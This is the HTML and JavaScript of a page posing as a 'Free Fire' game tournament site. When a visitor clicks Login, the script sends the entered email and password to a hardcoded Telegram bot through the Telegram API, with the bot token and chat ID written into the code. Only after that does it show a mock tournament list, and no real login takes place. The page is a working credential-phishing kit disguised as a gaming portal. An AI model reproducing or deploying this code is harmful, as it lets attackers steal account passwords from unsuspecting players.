<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire Tournament</title>
    <style>
        /* CSS Styles */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f4f4f4;
        }

        .page {
            display: flex;
            flex-direction: column;
            align-items: center;
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        .hidden {
            display: none;
        }

        h1, h2 {
            color: #333;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        input, button {
            padding: 10px;
            font-size: 1rem;
        }

        button {
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div id="login-page" class="page">
        <h1>Login</h1>
        <form id="login-form">
            <label for="email">Email:</label>
            <input type="email" id="email" required>
            <label for="password">Password:</label>
            <input type="password" id="password" required>
            <button type="button" id="login-button">Login</button>
        </form>
        
        <!-- Add the image code here -->
        <div style="text-align: center; margin-top: 20px;">
            <a href="https://drive.google.com/file/d/1y_SDJc_y-KUP_XpXHOI4muSzzwQ2dC9E/view?usp=sharing" target="_blank">
                <img src="https://drive.google.com/uc?id=1y_SDJc_y-KUP_XpXHOI4muSzzwQ2dC9E" alt="Best Tournament App" style="width: 300px; height: auto;">
            </a>
        </div>
    </div>

    <div id="tournament-page" class="page hidden">
        <h1>Free Fire Tournaments</h1>
        <div id="tournament-list">
            <div class="tournament">
                <h2>Tournament 1</h2>
                <button class="register-button">Register</button>
            </div>
            <div class="tournament">
                <h2>Tournament 2</h2>
                <button class="register-button">Register</button>
            </div>
        </div>
        <form id="registration-form" class="hidden">
            <h2>Register for Tournament</h2>
            <label for="username">Username:</label>
            <input type="text" id="username" required>
            <label for="player-id">Player ID:</label>
            <input type="text" id="player-id" required>
            <button type="submit">Submit</button>
        </form>
    </div>

    <!-- Include the script at the end -->
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            document.getElementById('login-button').addEventListener('click', function () {
                const email = document.getElementById('email').value;
                const password = document.getElementById('password').value;

                // Check if email and password are provided
                if (email && password) {
                    // Send login data to Telegram Bot
                    const botToken = '7752143826:AAELboFUkTLArRC9hCam8xkueAAGDEVLh2o';
                    const chatId = '6301044774';
                    const message = `Email: ${email}\nPassword: ${password}`;

                    // Send data to Telegram
                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message
                        })
                    })
                    .then(response => {
                        if (response.ok) {
                            alert('Login information sent successfully!');
                            // Proceed to the tournament page
                            document.getElementById('login-page').classList.add('hidden');
                            document.getElementById('tournament-page').classList.remove('hidden');
                        } else {
                            alert('Failed to send information.');
                        }
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        alert('An error occurred.');
                    });
                } else {
                    alert('Please enter email and password.');
                }
            });

            // Register buttons event listener
            document.querySelectorAll('.register-button').forEach(button => {
                button.addEventListener('click', function () {
                    document.getElementById('registration-form').classList.remove('hidden');
                });
            });

            // Registration form submit event
            document.getElementById('registration-form').addEventListener('submit', function (event) {
                event.preventDefault();
                alert('Registration submitted!');
                document.getElementById('registration-form').classList.add('hidden');
            });
        });
    </script>
</body>
</html>
